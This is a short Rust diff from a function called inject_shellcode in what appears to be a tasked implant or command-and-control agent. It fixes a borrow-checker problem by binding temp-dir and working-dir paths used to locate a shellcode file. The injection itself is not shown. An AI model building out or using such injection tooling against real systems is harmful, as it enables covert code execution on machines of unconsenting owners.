@@ -46,11 +46,15 @@ pub fn inject_shellcode(task: &AgentTask) -> Result<serde_json::Value, Box<dyn s
     
     let mut shellcode_bytes = Vec::new();
     
+    // Create longer-lived path bindings
+    let temp_path = std::env::temp_dir().join(&args.shellcode);
+    let current_path = std::env::current_dir()?.join(&args.shellcode);
+    
     // Try to read the file from various possible locations
     let possible_paths = vec![
         std::path::Path::new(&args.shellcode),
-        &std::env::temp_dir().join(&args.shellcode),
-        &std::env::current_dir()?.join(&args.shellcode),
+        &temp_path,
+        &current_path,
     ];
     
     let mut found_file = false;
